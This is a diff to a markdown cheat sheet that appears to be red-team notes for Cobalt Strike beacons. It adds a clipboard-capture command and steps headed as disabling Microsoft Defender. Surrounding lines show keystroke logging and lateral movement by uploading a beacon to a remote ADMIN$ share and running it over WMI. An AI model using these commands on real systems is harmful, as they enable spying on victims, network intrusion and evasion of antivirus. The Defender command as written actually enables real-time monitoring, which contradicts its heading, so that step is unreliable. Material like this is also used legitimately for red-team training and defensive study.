@@ -163,6 +163,9 @@ PS : [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('
 2. From **view** ---> **keystrokes**
 3. `jobs`
 
+#### via clipboard
+1. type `clipboard` command in beacon, and all the things that were **Copied [CTRL + C]** will come as the output. 
+
 ### Windows Privilege Escalation
 #### peer-to-peer listners
 1. generate a peer-to-peer listner e.g. **smb or tcp**. 
@@ -299,6 +302,9 @@ PS : [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('
 1. `beacon> cd \\srv-1\ADMIN$`
 2. `beacon> upload C:\Payloads\beacon-smb.exe`
 3. `beacon> remote-exec wmi srv-1 C:\Windows\beacon-smb.exe`
+#### Disable Microsoft Defender Antivirus and powershell commands
+1. As admin run this command in powershell to find microsoft defender status `Get-MpComputerStatus`
+2. As admin run this command in powershell -> `Set-MpPreference -DisableRealtimeMonitoring $false`
 
 ### Miscellaneous good points
 1. While doing active reconnisane, use VPN to hide the real Public IP address. 
